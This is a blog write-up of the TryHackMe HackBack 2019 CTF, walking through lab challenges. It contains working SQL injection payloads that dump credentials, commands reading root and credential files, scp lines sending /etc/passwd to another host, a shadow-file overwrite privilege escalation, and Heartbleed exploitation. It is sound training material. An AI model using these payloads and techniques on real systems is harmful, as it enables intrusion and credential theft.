---
title: TryHackMe - HackBack 2019
layout: post
description: A write up of the TryHackMe HackBack 2019 University CTF
tags: ctf tryhackme
toc: true
---

Access to the CTF can be found [here](https://tryhackme.com/room/hackback2019).

# Task 1: Connect to our network 
Free points for connecting to the challenge network? Sweet. However, our University address space conflicted with the CTF address space, making things a little harder. To get around this, I used a NAT adapter on my Kali VM to put it in a 192.0.0.0/8 address range, which solved the issue.
>
{% highlight bash %}
openvpn --config ./username.ovpn --daemon
{% endhighlight  %}

Once connected simply submit empty answers to get the points.

# Task 2: Pickle Rick [Web Exploitation] [Easy]

## Question 1: What is the first ingredient Rick needs?

As this is as an easy task I expected that either credentials or flags would be leaked somewhere on the page, opposed to through any fancy exploitation. If we look at the source code of the homepage we can see a username "hidden" as a comment.

>index.html
{:.filename}
{% highlight html %}
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
{% endhighlight  %}

I next looked at the "robots.txt" file as that is a common place for information leakage. 
>robots.txt
{:.filename}
{% highlight text %}
Wubbalubbadubdub
{% endhighlight  %}

As this wasn't in the usual format of a robots.txt file, this looks like it could be a password or a flag. As it was an incorrect flag, I kept it for a potential password.

The next step was to locate a login form to use these credentials. Continuing with the obvious, "login.php" turned out to be the correct page for this.

After login, we are given a primitive web shell with limited command access. An "ls" command reveals a "Sup3rS3cretPickl3Ingred.txt" and "clue.txt" in the web directory. The first file gives us the answer to the first question.


>Sup3rS3cretPickl3Ingred.txt
{:.filename}
{% highlight text %}
mr. meeseek hair
{% endhighlight  %}

## Question 2: Whats the second ingredient Rick needs?

We got a clue from the web directory about the location of the second ingrediant.

>clue.txt
{:.filename}
{% highlight text %}
Look around the file system for the other ingrediant.
{% endhighlight  %}

My first thought was to go look at home directories, so I ran ls on /home/, which showed a "rick" user. Given this is a Rick and Morty themed task, that sounded promising. An "ls" of "/home/rick" shows us a "second ingredients" file. However, attempting to use the "cat" command gives you a "Command disabled" error. The workaround I thought of for this was to use grep to match everything and print it.
>
{% highlight bash %}
grep .* /home/rick/second\ ingredients
{% endhighlight  %}

<!-- -->
>/home/rick/second ingredients
{:.filename}
{% highlight text %}
1 jerry tear
{% endhighlight  %}

## Question 3: Whats the final ingredient Rick needs?

As this is the last flag, I assumed it would likely be in root. However, we don't have permissions to browse that directory yet. Originally I used Perl to create a reverse shell to use sudo as I thought a TTY would be required, however, it turns out we can just use sudo from this web terminal. A "sudo ls" of "/root" shows us a "3rd.txt" which looks like what we are looking for.
>{% highlight bash %}
sudo grep .* /root/3rd.txt
{% endhighlight  %}
<!-- -->
>/root/3rd.txt
{:.filename}
{% highlight text %}
fleeb juice
{% endhighlight  %}

# Task 3: Gotta Catch em All [Scripting] [Medium]

To complete this challenge we need to understand what it wants us to create. It tells us that we need to connect to a specified port, do an operation on a number, and move on to the next port.

It gives us the format of "operation, number, next port" for each connection. The start conditions are to start on port 1337 and the sum at 0. The finish conditions are port 9765 or if STOP is in the page response. After which, the result should be printed.

The operations given are "add" and "minus", however, during testing I also found "multiply" and "divide".

The question tells us to give the answer to 2 decimal places, meaning our sums should be implemented as a float rather than an integer.

The IP that this challenge is deployed on, also tells us what port is currently open on port 3010.

Due to the nature of networking, it is also important to implement catching exceptions when connections inevitably fail.

Given these conditions here is my code:


>getflag.py
{:.filename}
{% highlight python %}
import socket
from time import sleep
ip="DEPLOYED IP"
getpage="GET / HTTP/1.1\nHost:" + ip + "\n\n"
def getopenport():
	portstart="<a target=\"_blank\" id=\"onPort\""
	portend="</a"
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, 3010))
		s.send(getpage.encode())
		httpdata=s.recv(1024)
		httpdata+=s.recv(1024)
		page=httpdata.decode()
		s.close()
		return int(page[page.find(portstart)+len(portstart):page.find(portend)])
	except:
		return 0

def processline(line, current_total):
	data=line.split()
	total=0
	operation=data[0]
	value=float(data[1])
	nextport=int(data[2])
	if "add" in operation:
		total=current_total+value
	elif "minus" in operation:
		total=current_total-value
	elif "multiply" in operation:
		total=current_total*value
	elif "divide" in operation:
		total=current_total/value
	else:
		print("ERROR!!!")
		print(line)
	return nextport, total

lastport=0
currentport=0
desiredport=1337
total=float(0)

while(True):
	currentport=getopenport()
	if(currentport != lastport):
		if(currentport != 0):
			lastport=currentport
			print("Current Port: " + str(currentport))
	if(currentport==desiredport):
		sleep(0.5)
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, desiredport))
			s.send(getpage.encode())
			httpdata=s.recv(1024)
			httpdata+=s.recv(1024)
			page=httpdata.decode()
			s.close()
			if "STOP" in page:
				break
			lines=page.split("\n")
			print("Recieved: " + lines[-1])
			desiredport, total=processline(lines[-1], total)
			if desiredport == 9765:
				break
			print("Current Total: " + str(total))
		except:
			print("Connection failed to: " + ip + ":" + str(currentport))
	else:
		sleep(1)
print("Finished the final total is:")
print(round(total,2))
{% endhighlight  %}


# Task 4: Jursassic Park [Web Exploitation] [Medium]

Straight from the questions, we can tell that this probably going to involve SQL injection. It references database information in the first flags then seems to move on to compromising the server as a whole.

A quick nmap scan shows that the server only has SSH and HTTP open, but does tell us that the SSH server accepts password authentication for login - suggesting that we should find credentials in the SQL Database.

So let us just fire SQLMap at it and dump the database, right?

![SQLMap Fail]({{ '/assets/images/hackback-2019/hackback-2019-sqlmap.jpeg' | relative_url }}){: .center-image }*SQLMap failing to get anything*

Whoops. Further investigation shows us that it seems like some filtering is being done on the input. I tried for a while to try and wrangle SQLMap into working around it, however in the end I decided that doing it manually would be both educational and take less time.

![Permission Denied]({{ '/assets/images/hackback-2019/hackback-2019-permissiondenied.jpeg' | relative_url }}){: .center-image }*Permissioned Denied entering "--"*

However, we can confirm SQL Injection is possible as if we enter strings like "3-1" we get result 2, showing that the entry is dynamic. ID number 5 leaks some information about the filtering, returning "Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?".

Testing of these characters shows that # isn't correctly filtered and can be used to comment out the rest of the code.

## Question 1: What is the SQL database called which is serving the shop information?

Using "union select" we can add extra data onto the data returned by the query. Any columns we don't need can simply be filled with null to match the number of columns in the other search. The "DATABASE()" function should give us the answer to this question if the backend is using MySQL, and indeed it does, the following id parameter will tell us that the database name is "park".

>{% highlight sql %}
id=1 union select null, null, null, DATABASE(), null#
{% endhighlight  %}

## Question 2: How many columns does the table have?

Given that 5 fields were required for the union select, that is a solid guess for this question and indeed it is correct.

## Question 3: Whats the system version?

Similar to the first question, we can use the "version()" function to get the version of both the database server and the server it is running on.

>{% highlight sql %}
id=1 union select null, null,null , version(), null#
{% endhighlight  %}

This returns "5.7.25-0ubuntu0.16.04.2" - telling us that the operating system is Ubuntu 16.04.2, and the database version being MySQL 5.7.25-0.


## Question 4: What is dennis' password?

For this question, I tried a bunch of things. Getting the MySQL authentication strings and attempting to crack them with John the Ripper. I tried again to get SQLMap to pop a shell to get access to the file system, but once again I failed. I also tried to read "/etc/passwd" through SQL, but that didn't work suggesting "secure file priv" was enabled.

Returning back to the database, I had to assume that the usernames and passwords would be in there somewhere. So I dumped the tables in the "park" database to see if there was anything promising.

>{% highlight sql %}
id=0 union select null, null, null, table_name, table_schema FROM information_schema.tables WHERE table_schema="park" LIMIT 1 OFFSET 1#
{% endhighlight  %}

A "users" table sounds like what we needed, so I decided to look at the column names to see how the query would need to be constructed.

>{% highlight sql %}
id=0 union select null, null, null, table_name, COLUMN_NAME FROM information_schema.columns WHERE table_name="users" AND table_schema="park" LIMIT 1 OFFSET 2#
{% endhighlight  %}

This tells there is "id", "username",  and "password" columns. This is slightly an issue as "username" is filtered from the input. However, we can bypass that issue altogether by just selecting all the columns as there are only 3 of them, then we can pad it out with 2 nulls.

>{% highlight sql %}
id=0 union select *, null, null FROM users  LIMIT 1 OFFSET 1#
{% endhighlight  %}


This gives us dennis' password - "ih8dinos"

## Question 5: Locate and get the first flag contents.

Helpfully the credentials of "dennis:ih8dinos" are also valid for SSH access. The first flag can be found in the home directory of dennis.

>/home/dennis/flag1.txt
{:.filename}
{% highlight text %}
Congrats on finding the first flag.. But what about the rest? :O

b89f2d69c56b9981ac92dd267f
{% endhighlight  %}

## Question 7: Whats the contents of the third flag?

I guessed that the second flag might be somewhere in the web site's files somewhere, so I decided to have a quick look before examining the file system further. I didn't find a flag, but I did figure out why SQLMap was choking so hard.

>/var/www/html/item.php
{:filename}
{% highlight php %}
  // ====== Start of MySQL troll with time.. make wait forever ======

  $header = getallheaders()['User-Agent'];
  if(contains($header, array("sqlmap"))) {
    echo 'SQL ERROR</br>';
    // Fool sqlmap
    for($x=0; $x<= rand(10, 30); $x++) {
      if($x <= 13) {
        sleep(1);
      }
      echo 'SQL ERROR</br>';
      $colors = array("styracosaurus", "velociraptor", "diplodocus", "change your user-agent"); // ANSWER IN HERE??? LIKE A HINT OR SOMETHING. Dinosaur wordlist?
      echo rand(10, 20) . ' </br>';
      foreach ($colors as $value) {
          echo "$value <br>";
      }
    }

    echo ("Error: The used SELECT "+rand()+" have a different number of columns" + rand());
    echo $_GET['id'];
    exit();
  }

  // ====== Finish of MySQL Troll ======
{% endhighlight  %}

That would explain a lot. Made life difficult but I love that it forces you to understand what you're doing properly.

Not finding anything in the web directory, I decided to look at bash history for the dennis user. 

>/home/dennis/.bash_history
{:.filename}
{% highlight text %}
Flag3:b4973bbc9053807856ec815db25fb3f1
...
sudo scp /etc/passwd dennis@10.0.0.59:~/
sudo scp /etc/passwd dennis@10.0.0.59:/home/dennis
sudo scp /etc/passwd ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
...
{% endhighlight  %}

I wasn't looking for the third flag but I'll take it.

## Question 9: Whats the contents of the fifth flag?

Since I had a lead on the fifth flag, I decided to go for that one next. Since the next flag is in root and the bash history shows the use of sudo, I used "sudo -l" to see what command we were allowed to use as root. Helpfully, like in the user's history, we can use scp as root. 

We can use this to copy "/root/flag5.txt" over the network back to the dennis user so we can read it.

>{% highlight bash %}
sudo scp /root/flag5.txt dennis@10.0.0.222:~/
{% endhighlight  %}


>/root/flag5.txt
{:.filename}
{% highlight text %}
2a7074e491fcacc7eeba97808dc5e2ec
{% endhighlight  %}

## Question 6: Whats the contents of the second flag?

At this point, I decided that needed root to continue, so I decided to look into privledge escalation exploits for this system. Given that the "delete" file in the web directory hints at a MySQL privilege escalation vulnerability. I tried using both search sploit for the kernel and MySQL versions, as well as creating a reverse shell for Metasploit and using their local exploit suggester.

None of this worked, and I was starting to give up. Then I once again realised that I was coming at this from the wrong angle. The scp utility doesn't just work as a remote copy utility, but also a local copy utility. Using this, I copied the /etc/shadow file in the same way that I copied flag5.txt to the dennis user's home directory, altered the password hash to the same as dennis', then used "su" to get root access.

Now that we have full access, I started looking at other bash histories to see what else had been done on the system. Root's was empty but the "ubuntu" user was promising.

>/home/ubuntu/.bash_history
{:.filename}
{% highlight text %}
...
cd /boot/grub/fonts/
vim flagTwo.txt
sudo vim flagTwo.txt
chmod u+r
sudo chmod u+r flagTwo.txt 
sudo chmod o+r flagTwo.txt 
...
{% endhighlight  %}

Looks promising.

>/boot/grub/fonts/flagTwo.txt
{:.filename}
{% highlight text %}
96ccd6b429be8c9a4b501c7a0b117b0a
{% endhighlight  %}

Bingo.

## Question 8: Whats the contents of the fourth flag?

Going around this in a weird order, but the last flag I needed to find was Flag 4. Unfortunately I couldn't find it anywhere!

I found some evidence in "/home/ubuntu/.viminfo", suggesting it was in "/tmp/" but it doesn't exist and after talking to the organiser they told me that it was a rabbit hole and the flag hadn't accidentally been deleted on boot.

I also tried a whole bunch of common other locations such as crontab, important configuration files, and important logging files with no success. I also tried greping the file system for "flag4" and "flagfour" with no success. I look forward to hearing where this flag is because 

I even tried using dd and ssh to copy an image of the hard drive over the network to my computer. I did find some evidence of the flag file but I don't have enough experiance with hard drive foresrensics to locate it within the image.

# Task 5: Base64 [Scripting] [Easy]

While my initial gut reaction was to use bash for this, I decided to use Python as I'm more capable with it and debugging would be quicker for me personally. The instructions for this are quite clear, you needed to base64 decode the string 50 times, so here is my python script.


>getflag.py
{:.filename}
{% highlight python %}
import base64, io

file = open("b64.txt", "r")
text=file.read()

for i in range(50):
	text=base64.b64decode(text)

print(text.decode())
{% endhighlight  %}

# Task 6: Secret Encryption [Reverse Engineering] [Easy]

From the task name we know that the flag we're looking for likely encrypted in some way. I quick "strings" of the file doesn't reveal the flag, but does give a strong indication that ROT 13 is involved in some way.

>strings encrypted-password
{:.filename}
{% highlight text %}
...
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
rot13new.c
__FRAME_END__
__init_array_end
...
{% endhighlight  %}

However, I could not find anything that looked like a flag in the file's strings. I decided to take things a bit further and open up the NSA's reverse engineering tool Ghidra and decompile the binary to see what is really happening.

![Ghidra Decompiler]({{ '/assets/images/hackback-2019/hackback-2019-ghidra.jpeg' | relative_url }}){: .center-image }*Ghidra decompiler showing a C version of the program*

This shows us a case statement spelling out "THMRANDENC" which looks like a potential flag, which was indeed correct.

# Task 7: Protecting Data In Transit [Web Exploitation] [Easy]

Given that the name of this machine is "Heartbleed" and there are multiple heartbleed references in the webpage, what we need to do here is pretty obvious. I used metasploit and it's "auxiliary/scanner/ssl/openssl_heartbleed" module.

We need to set the "RHOSTS" variable to the machine's ip and "verbose" to true to read the memory contents.

As this CTF does not have a strict flag format, we will have to manually look through the dumped data. Given multiple previous flags have had "THM" (Try Hack Me) in it, it's likely to contain that.

>Heartbleed Data
{:.filename}
{% highlight text %}
...
[*] 10.0.0.143:443        - Printable info leaked:......\.<.h......4...6'.3....e...B(N....f.....
".!.9.8.........5.............................3.2.....E.D...../...A.............................
..........(KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36..Content-Length: 75..Content-Typ
e: application/x-www-form-urlencoded....user_name=hacker101&user_email=haxor@haxor.com&user_mess
age=THM{sSl-Is-BaD}.!.}..+.....i................................................................
..................................................................... repeated 15755 times
...
{% endhighlight  %}


It took a few runs but I eventually identified the flag "THM{sSl-Is-BaD}".

# Task 9: Char-Array [Reverse Engineering] [Easy]

Once again as this is an easy reverse engineering challenge, strings is my goto tool. 

>strings char-array
{:.filename}
{% highlight text %}
...

enter password
password is correct
password is incorrect
THM{bAsIc-rE}
;*3$"
GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
crtstuff.c
...
{% endhighlight  %}

A quick run of it immediately gives us the flag "THM{bAsIc-rE}".

# Task 11: Steganography [Forensics] [Medium]

## Question 1: What is the first flag?

The file we are given as an image. My first port of call for Steganography in this case is exiftool.

>exiftool Lenna.jpg
{:.filename}
{% highlight text %}
...
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Artist                          : flag1:ebe37d3f236915ef1d91d864b352f80b
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 512x512
...
{% endhighlight  %}

This immediately gives us the first flag "ebe37d3f236915ef1d91d864b352f80b"

## Question 2: What is the second flag?

Given that we are given multiple flags for this one file, it's likely that it has multiple file types within the one file.

>binwalk Lenna.jpg
{:.filename}
{% highlight text %}
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 512 x 512, 8-bit/color RGB, non-interlaced
54            0x36            Zlib compressed data, best compression
473888        0x73B20         Zip archive data, encrypted at least v2.0 to extract, compressed size: 17113, uncompressed size: 21465, name: flag2.mp3
491084        0x77E4C         Zip archive data, encrypted at least v2.0 to extract, compressed size: 2405, uncompressed size: 8600, name: flag4
493568        0x78800         Zip archive data, encrypted at least v2.0 to extract, compressed size: 536074, uncompressed size: 538041, name: flag5.png
2720711       0x2983C7        End of Zip archive
{% endhighlight  %}

This tells us that there is a zip file with multiple other files hidden within the png. We can run foremost on the image to extract the zip file, the unzip it with unzip. Unfortunately it has a password. I used the first flag (ebe37d3f236915ef1d91d864b352f80b) as the password on a whim, and it worked!

This gives us a "flag2.mp3" file - I gave it a quick listen before trying anything crazy, and it turns out to be a computer voice saying "flag two is steganographyrules with no spaces". If we enter this, it accepts this as the flag.


## Question 3: What is the third flag?

Given that the rest of the flags are covered by another file, I decieded to look at the two "Stéphane.png" files. They appear to be identically named but are likely using similar unicode characters to be different in reality. I renamed these to "steph1.png" and "steph2.png" to make referencing them easier.

They appear to be identical but one is slightly longer. I decided to run strings on the longer one to see if if there was a flag in the data.

>strings Stéphane.png
{:.filename}
{% highlight text %}
...
lTWN.\
`=OM
IEND
flag3:e8c02d01b173d905df0a07b2f143c587
{% endhighlight  %}



This found the third flag "e8c02d01b173d905df0a07b2f143c587".


## Question 4: What is the fourth flag?

The "flag4" file doesn't have an extention. Running "file" on it tells us that it's an elf excutable. Running strings on that file 

>strings flag4
{:.filename}
{% highlight text %}
...
AWAVA
AUATL
[]A\A]A^A_
Nothing to see here..
c3RlZ29zYXVydXM=
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
crtstuff.c
...
{% endhighlight  %}

This shows us "Nothing to see here" followed by what looks like a base64 string.

This can be decoded with "echo c3RlZ29zYXVydXM= | base64 -d" which gives us "stegosaurus". I entered this as the fourth flag and it was correct.



## Question 5: What is the fifth flag?

The "flag5.png" is an image of a Stegosarus. Running strings and exiftool on this image brough up nothing. So I decided to use the [photo forensics](https://29a.ch/photo-forensics/#noise-analysis) tool from 29a.ch to look for evidence of the image being modified. 

![Error Level Analysis]({{ '/assets/images/hackback-2019/hackback-2019-flag5-errorlevel.png' | relative_url }}){: .center-image }*Error level analysis of the flag5.png file*

This shows what looks like ASCII character values. I used [CyberChef](https://gchq.github.io/CyberChef/) to convert this into a string which gave us the fifth flag "efb2f10fad88b0739ce3c67bf578ace6".


## Question 6: What is the sixth flag?

I spent a lot of time trying to get this flag. I intepreted the hint "outside of the box" to mean in the original file and not in any of the zip files. I noticed some what looked like bar code patterns that looked like some encoding on the edge of the image in a box like pattern.

However, when I looked up the orginal image to XOR it out, it was identical to the image I found on wikipedia, ruling that sort of stuff out.

This stumped me for a while until on a whim I decided to download the image on the challenge page next to the download button for the challenge because that was also "outside of the box".


>strings flag4
{:.filename}
{% highlight text %}
...
X Resolution                    : 1
Y Resolution                    : 1
Resolution Unit                 : None
Artist                          : flag6:alwaysThinkOutsideTheBox
Y Cb Cr Positioning             : Centered
Image Width                     : 259
Image Height                    : 194
...
{% endhighlight  %}

This give us the final flag for this challenge "flag6:alwaysThinkOutsideTheBox".




